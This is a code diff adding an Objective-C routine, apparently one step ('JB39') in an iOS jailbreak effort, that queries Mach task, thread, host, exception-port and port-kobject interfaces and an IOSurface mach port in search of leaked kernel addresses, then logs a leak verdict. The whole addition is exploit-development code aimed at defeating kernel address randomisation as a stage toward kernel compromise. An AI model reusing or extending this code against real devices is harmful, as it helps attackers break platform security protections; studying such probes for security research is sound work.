@@ -35102,3 +35102,372 @@ void iosurface_kleak(ISRLogBlock log, ISRDoneBlock done) {
         done(results);
     });
 }
+
+// MARK: - JB39: Exception Ports + Task Info + Mach OOL Spray
+void iosurface_exc_leak(ISRLogBlock log, ISRDoneBlock done) {
+    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
+        log(@"JB39: === Exception Port + Task Info Leak ===");
+
+        NSMutableDictionary *results = [NSMutableDictionary dictionary];
+
+        extern void jb25_setup(void);
+        extern volatile unsigned long jb25_far;
+        extern volatile int jb25_sig;
+        extern volatile sig_atomic_t jb25_in_probe;
+        extern struct jb25_jb_holder *jb25_jb_ptr;
+        jb25_setup();
+
+        typedef unsigned int (*mach_task_self_fn)(void);
+        mach_task_self_fn taskSelfFn = dlsym(RTLD_DEFAULT, "mach_task_self");
+        unsigned int task = taskSelfFn ? taskSelfFn() : 0;
+
+        // =====================================================================
+        // FASE 1: task_info — TASK_DYLD_INFO, TASK_EXTMOD_INFO, TASK_VM_INFO
+        // =====================================================================
+        log(@"JB39: === Fase 1: task_info ===");
+
+        typedef int (*task_info_fn)(unsigned int, uint32_t, void *, uint32_t *);
+        task_info_fn taskInfoFn = dlsym(RTLD_DEFAULT, "task_info");
+        log([NSString stringWithFormat:@"JB39:   task_info = %p", taskInfoFn]);
+
+        if (taskInfoFn && task) {
+            // TASK_DYLD_INFO = 17
+            uint64_t dyldBuf[8] = {0};
+            uint32_t dyldCnt = sizeof(dyldBuf) / 4;
+            int kr = taskInfoFn(task, 17, dyldBuf, &dyldCnt);
+            log([NSString stringWithFormat:@"JB39:   TASK_DYLD_INFO kr=%d cnt=%u", kr, dyldCnt]);
+            if (kr == 0) {
+                for (int i = 0; i < 4; i++) {
+                    log([NSString stringWithFormat:@"JB39:   dyld[%d] = %#llx", i, dyldBuf[i]]);
+                    if (dyldBuf[i] > 0xFFFFFF8000000000ULL) {
+                        log([NSString stringWithFormat:@"JB39:   [KPTR!] dyld[%d]", i]);
+                        results[@"dyldKptr"] = [NSString stringWithFormat:@"%#llx", dyldBuf[i]];
+                    }
+                }
+            }
+
+            // TASK_EXTMOD_INFO = 19
+            uint64_t extBuf[8] = {0};
+            uint32_t extCnt = sizeof(extBuf) / 4;
+            kr = taskInfoFn(task, 19, extBuf, &extCnt);
+            log([NSString stringWithFormat:@"JB39:   TASK_EXTMOD_INFO kr=%d cnt=%u", kr, extCnt]);
+            if (kr == 0) {
+                for (uint32_t i = 0; i < extCnt / 2 && i < 4; i++) {
+                    log([NSString stringWithFormat:@"JB39:   ext[%u] = %#llx", i, extBuf[i]]);
+                }
+            }
+
+            // TASK_VM_INFO = 22
+            uint64_t vmBuf[64] = {0};
+            uint32_t vmCnt = sizeof(vmBuf) / 4;
+            kr = taskInfoFn(task, 22, vmBuf, &vmCnt);
+            log([NSString stringWithFormat:@"JB39:   TASK_VM_INFO kr=%d cnt=%u", kr, vmCnt]);
+            if (kr == 0) {
+                int vmKptrs = 0;
+                for (uint32_t i = 0; i < vmCnt / 2 && i < 32; i++) {
+                    if (vmBuf[i] > 0xFFFFFF8000000000ULL && vmBuf[i] < 0xFFFFFFF000000000ULL) {
+                        vmKptrs++;
+                        log([NSString stringWithFormat:@"JB39:   [KPTR!] vm[%u] = %#llx", i, vmBuf[i]]);
+                    }
+                }
+                // Log interesting VM stats
+                log([NSString stringWithFormat:@"JB39:   vm: vsize=%llu pages=%llu resident=%llu",
+                     vmBuf[0], vmBuf[1], vmBuf[2]]);
+                results[@"vmInfoKptrs"] = @(vmKptrs);
+            }
+
+            // TASK_FLAGS_INFO = 25
+            uint32_t flagsBuf[4] = {0};
+            uint32_t flagsCnt = sizeof(flagsBuf) / 4;
+            kr = taskInfoFn(task, 25, flagsBuf, &flagsCnt);
+            log([NSString stringWithFormat:@"JB39:   TASK_FLAGS_INFO kr=%d flags=%#x", kr, flagsBuf[0]]);
+            results[@"taskFlags"] = @(flagsBuf[0]);
+
+            // TASK_BASIC_INFO = 5
+            uint64_t basicBuf[16] = {0};
+            uint32_t basicCnt = sizeof(basicBuf) / 4;
+            kr = taskInfoFn(task, 5, basicBuf, &basicCnt);
+            log([NSString stringWithFormat:@"JB39:   TASK_BASIC_INFO kr=%d cnt=%u", kr, basicCnt]);
+            if (kr == 0) {
+                for (uint32_t i = 0; i < basicCnt / 2 && i < 8; i++) {
+                    if (basicBuf[i] > 0xFFFFFF8000000000ULL) {
+                        log([NSString stringWithFormat:@"JB39:   [KPTR!] basic[%u] = %#llx", i, basicBuf[i]]);
+                    }
+                }
+            }
+        }
+
+        if (isr_stopped()) { done(results); return; }
+
+        // =====================================================================
+        // FASE 2: thread_info — search for kernel addresses in thread state
+        // =====================================================================
+        log(@"JB39: === Fase 2: thread_info ===");
+
+        typedef int (*task_threads_fn)(unsigned int, unsigned int **, uint32_t *);
+        typedef int (*thread_info_fn)(unsigned int, uint32_t, void *, uint32_t *);
+        task_threads_fn taskThreadsFn = dlsym(RTLD_DEFAULT, "task_threads");
+        thread_info_fn threadInfoFn = dlsym(RTLD_DEFAULT, "thread_info");
+
+        if (taskThreadsFn && threadInfoFn && task) {
+            unsigned int *threads = NULL;
+            uint32_t threadCount = 0;
+            int kr = taskThreadsFn(task, &threads, &threadCount);
+            log([NSString stringWithFormat:@"JB39:   task_threads kr=%d count=%u", kr, threadCount]);
+
+            if (kr == 0 && threads && threadCount > 0) {
+                // THREAD_BASIC_INFO = 3
+                uint64_t thrBuf[16] = {0};
+                uint32_t thrCnt = sizeof(thrBuf) / 4;
+                kr = threadInfoFn(threads[0], 3, thrBuf, &thrCnt);
+                log([NSString stringWithFormat:@"JB39:   THREAD_BASIC_INFO kr=%d cnt=%u", kr, thrCnt]);
+
+                // THREAD_IDENTIFIER_INFO = 4
+                uint64_t idBuf[8] = {0};
+                uint32_t idCnt = sizeof(idBuf) / 4;
+                kr = threadInfoFn(threads[0], 4, idBuf, &idCnt);
+                log([NSString stringWithFormat:@"JB39:   THREAD_IDENTIFIER_INFO kr=%d cnt=%u", kr, idCnt]);
+                if (kr == 0) {
+                    for (uint32_t i = 0; i < idCnt / 2 && i < 4; i++) {
+                        log([NSString stringWithFormat:@"JB39:   tid[%u] = %#llx", i, idBuf[i]]);
+                        if (idBuf[i] > 0xFFFFFF8000000000ULL) {
+                            log([NSString stringWithFormat:@"JB39:   [KPTR!] tid[%u]", i]);
+                            results[@"threadKptr"] = [NSString stringWithFormat:@"%#llx", idBuf[i]];
+                        }
+                    }
+                }
+
+                // THREAD_EXTENDED_INFO = 5
+                uint64_t extThrBuf[32] = {0};
+                uint32_t extThrCnt = sizeof(extThrBuf) / 4;
+                kr = threadInfoFn(threads[0], 5, extThrBuf, &extThrCnt);
+                log([NSString stringWithFormat:@"JB39:   THREAD_EXTENDED_INFO kr=%d cnt=%u", kr, extThrCnt]);
+            }
+        }
+
+        if (isr_stopped()) { done(results); return; }
+
+        // =====================================================================
+        // FASE 3: Exception port — set up handler, inspect messages
+        // =====================================================================
+        log(@"JB39: === Fase 3: Exception port ===");
+
+        typedef int (*mach_port_allocate_fn)(unsigned int, int, unsigned int *);
+        typedef int (*mach_port_insert_right_fn)(unsigned int, unsigned int, unsigned int, int);
+        typedef int (*task_set_exception_ports_fn)(unsigned int, int, unsigned int, int, int);
+        typedef int (*task_get_exception_ports_fn)(unsigned int, int, unsigned int *, uint32_t *,
+            unsigned int *, int *, int *);
+        typedef int (*mach_port_deallocate_fn)(unsigned int, unsigned int);
+
+        mach_port_allocate_fn portAlloc = dlsym(RTLD_DEFAULT, "mach_port_allocate");
+        mach_port_insert_right_fn portInsert = dlsym(RTLD_DEFAULT, "mach_port_insert_right");
+        task_get_exception_ports_fn getExcPorts = dlsym(RTLD_DEFAULT, "task_get_exception_ports");
+        mach_port_deallocate_fn portDealloc = dlsym(RTLD_DEFAULT, "mach_port_deallocate");
+
+        log([NSString stringWithFormat:@"JB39:   task_get_exception_ports = %p", getExcPorts]);
+
+        if (getExcPorts && task) {
+            // EXC_MASK_ALL = 0x3FFE
+            unsigned int masks[32] = {0};
+            uint32_t maskCount = 32;
+            unsigned int ports[32] = {0};
+            int behaviors[32] = {0};
+            int flavors[32] = {0};
+
+            int kr = getExcPorts(task, 0x3FFE, masks, &maskCount, ports, behaviors, flavors);
+            log([NSString stringWithFormat:@"JB39:   get_exception_ports kr=%d count=%u", kr, maskCount]);
+
+            if (kr == 0) {
+                for (uint32_t i = 0; i < maskCount; i++) {
+                    log([NSString stringWithFormat:@"JB39:   exc[%u] mask=%#x port=%u behavior=%d flavor=%d",
+                         i, masks[i], ports[i], behaviors[i], flavors[i]]);
+                    // Port name itself can encode info
+                    if (ports[i] > 0) {
+                        results[[NSString stringWithFormat:@"excPort%u", i]] = @(ports[i]);
+                    }
+                }
+            }
+        }
+
+        if (isr_stopped()) { done(results); return; }
+
+        // =====================================================================
+        // FASE 4: host_info — host statistics, processor info
+        // =====================================================================
+        log(@"JB39: === Fase 4: host_info ===");
+
+        typedef unsigned int (*mach_host_self_fn)(void);
+        typedef int (*host_info_fn)(unsigned int, uint32_t, void *, uint32_t *);
+        typedef int (*host_statistics64_fn)(unsigned int, uint32_t, void *, uint32_t *);
+        typedef int (*host_processor_info_fn)(unsigned int, uint32_t, uint32_t *,
+            int **, uint32_t *);
+
+        mach_host_self_fn hostSelf = dlsym(RTLD_DEFAULT, "mach_host_self");
+        host_info_fn hostInfoFn = dlsym(RTLD_DEFAULT, "host_info");
+        host_statistics64_fn hostStats64 = dlsym(RTLD_DEFAULT, "host_statistics64");
+        host_processor_info_fn hostProcInfo = dlsym(RTLD_DEFAULT, "host_processor_info");
+
+        unsigned int host = hostSelf ? hostSelf() : 0;
+
+        if (hostInfoFn && host) {
+            // HOST_BASIC_INFO = 1
+            uint32_t basicInfo[16] = {0};
+            uint32_t basicCnt = 16;
+            int kr = hostInfoFn(host, 1, basicInfo, &basicCnt);
+            log([NSString stringWithFormat:@"JB39:   HOST_BASIC_INFO kr=%d cnt=%u", kr, basicCnt]);
+            if (kr == 0) {
+                log([NSString stringWithFormat:@"JB39:   max_cpus=%u avail_cpus=%u memsize=%u",
+                     basicInfo[0], basicInfo[1], basicInfo[2]]);
+                results[@"maxCpus"] = @(basicInfo[0]);
+            }
+
+            // HOST_SCHED_INFO = 3
+            uint32_t schedInfo[8] = {0};
+            uint32_t schedCnt = 8;
+            kr = hostInfoFn(host, 3, schedInfo, &schedCnt);
+            log([NSString stringWithFormat:@"JB39:   HOST_SCHED_INFO kr=%d", kr]);
+        }
+
+        if (hostStats64 && host) {
+            // HOST_VM_INFO64 = 4
+            uint64_t vmStats[64] = {0};
+            uint32_t vmStatsCnt = sizeof(vmStats) / 4;
+            int kr = hostStats64(host, 4, vmStats, &vmStatsCnt);
+            log([NSString stringWithFormat:@"JB39:   HOST_VM_INFO64 kr=%d cnt=%u", kr, vmStatsCnt]);
+            if (kr == 0) {
+                // Check all fields for kernel pointers
+                int hostKptrs = 0;
+                for (uint32_t i = 0; i < vmStatsCnt / 2 && i < 32; i++) {
+                    if (vmStats[i] > 0xFFFFFF8000000000ULL && vmStats[i] < 0xFFFFFFF000000000ULL) {
+                        hostKptrs++;
+                        log([NSString stringWithFormat:@"JB39:   [KPTR!] vmstat[%u] = %#llx", i, vmStats[i]]);
+                    }
+                }
+                // Log page stats
+                uint32_t *ps = (uint32_t *)vmStats;
+                log([NSString stringWithFormat:@"JB39:   free=%u active=%u inactive=%u wire=%u",
+                     ps[0], ps[1], ps[2], ps[3]]);
+                results[@"freePages"] = @(ps[0]);
+                results[@"wirePages"] = @(ps[3]);
+                results[@"hostVmKptrs"] = @(hostKptrs);
+            }
+        }
+
+        if (isr_stopped()) { done(results); return; }
+
+        // =====================================================================
+        // FASE 5: Mach message OOL + port kobject type
+        // =====================================================================
+        log(@"JB39: === Fase 5: Mach msg OOL + kobject ===");
+
+        typedef int (*mach_port_kobject_fn)(unsigned int, unsigned int, uint32_t *, uint64_t *);
+        mach_port_kobject_fn portKobj = dlsym(RTLD_DEFAULT, "mach_port_kobject");
+
+        log([NSString stringWithFormat:@"JB39:   mach_port_kobject = %p", portKobj]);
+
+        if (portKobj && task) {
+            // Try to get kobject info for well-known ports
+            unsigned int wellKnown[] = {
+                task,     // our task port
+                host,     // host port
+            };
+            const char *names[] = {"task_self", "host_self"};
+
+            for (int i = 0; i < 2; i++) {
+                uint32_t ktype = 0;
+                uint64_t kaddr = 0;
+                int kr = portKobj(task, wellKnown[i], &ktype, &kaddr);
+                log([NSString stringWithFormat:@"JB39:   kobject(%s=%u) kr=%d type=%u addr=%#llx",
+                     names[i], wellKnown[i], kr, ktype, kaddr]);
+                if (kr == 0 && kaddr > 0xFFFFFF8000000000ULL) {
+                    log([NSString stringWithFormat:@"JB39:   [KPTR!!!] %s kobject = %#llx", names[i], kaddr]);
+                    results[[NSString stringWithFormat:@"kobj_%s", names[i]]] =
+                        [NSString stringWithFormat:@"%#llx", kaddr];
+                }
+            }
+        }
+
+        // Also try mach_port_kernel_object (older API)
+        typedef int (*mach_port_kernel_object_fn)(unsigned int, unsigned int, uint32_t *, uint32_t *);
+        mach_port_kernel_object_fn portKernObj = dlsym(RTLD_DEFAULT, "mach_port_kernel_object");
+        log([NSString stringWithFormat:@"JB39:   mach_port_kernel_object = %p", portKernObj]);
+
+        if (portKernObj && task) {
+            uint32_t ktype = 0, kaddr32 = 0;
+            int kr = portKernObj(task, task, &ktype, &kaddr32);
+            log([NSString stringWithFormat:@"JB39:   kernel_object(task) kr=%d type=%u addr=%#x",
+                 kr, ktype, kaddr32]);
+        }
+
+        // mach_port_space_info — might leak internal table info
+        typedef int (*mach_port_space_info_fn)(unsigned int, void *, unsigned int **, uint32_t *,
+            unsigned int **, uint32_t *);
+        mach_port_space_info_fn spaceInfo = dlsym(RTLD_DEFAULT, "mach_port_space_info");
+        log([NSString stringWithFormat:@"JB39:   mach_port_space_info = %p", spaceInfo]);
+
+        // Try IOSurface mach port for kobject
+        typedef void *(*IOSurfaceCreate_fn)(void *);
+        typedef unsigned int (*IOSurfaceCreateMachPort_fn)(void *);
+        IOSurfaceCreate_fn surfCreate = dlsym(RTLD_DEFAULT, "IOSurfaceCreate");
+        IOSurfaceCreateMachPort_fn surfCreatePort = dlsym(RTLD_DEFAULT, "IOSurfaceCreateMachPort");
+
+        if (surfCreate && surfCreatePort && portKobj) {
+            NSDictionary *props = @{
+                @"IOSurfaceWidth": @(32),
+                @"IOSurfaceHeight": @(32),
+                @"IOSurfaceBytesPerElement": @(4),
+                @"IOSurfaceAllocSize": @(4096),
+            };
+            void *surf = surfCreate((__bridge void *)props);
+            if (surf) {
+                unsigned int surfPort = surfCreatePort(surf);
+                uint32_t ktype = 0;
+                uint64_t kaddr = 0;
+                int kr = portKobj(task, surfPort, &ktype, &kaddr);
+                log([NSString stringWithFormat:@"JB39:   kobject(iosurf_port=%u) kr=%d type=%u addr=%#llx",
+                     surfPort, kr, ktype, kaddr]);
+                if (kr == 0 && kaddr > 0xFFFFFF8000000000ULL) {
+                    log([NSString stringWithFormat:@"JB39:   [KPTR!!!] IOSurface kobject = %#llx", kaddr]);
+                    results[@"surfKobj"] = [NSString stringWithFormat:@"%#llx", kaddr];
+                }
+                results[@"surfKobjType"] = @(ktype);
+            }
+        }
+
+        // =====================================================================
+        // VERDICT
+        // =====================================================================
+        log(@"JB39: =============================================");
+
+        BOOL hasKptr = NO;
+        for (NSString *k in results) {
+            if ([k hasPrefix:@"kobj_"] || [k isEqualToString:@"surfKobj"] ||
+                [k isEqualToString:@"dyldKptr"] || [k isEqualToString:@"threadKptr"]) {
+                hasKptr = YES;
+                break;
+            }
+        }
+
+        int vmInfoKptrs = [results[@"vmInfoKptrs"] intValue];
+        int hostVmKptrs = [results[@"hostVmKptrs"] intValue];
+
+        NSString *verdict;
+        if (hasKptr) {
+            verdict = @"KOBJECT_LEAK";
+            log(@"JB39: [!!!!!] Kernel object address leaked!");
+        } else if (vmInfoKptrs > 0 || hostVmKptrs > 0) {
+            verdict = @"STATS_LEAK";
+            log(@"JB39: [!!!] Kernel ptrs in task/host info!");
+        } else {
+            verdict = @"NO_LEAK";
+            log(@"JB39: No kernel leaks found");
+        }
+
+        results[@"verdict"] = verdict;
+        log([NSString stringWithFormat:@"JB39: Verdict: %@", verdict]);
+        log(@"JB39: =============================================");
+
+        isr_checkpoint(@"JB39-exc-leak-checkpoint.json", results);
+        done(results);
+    });
+}
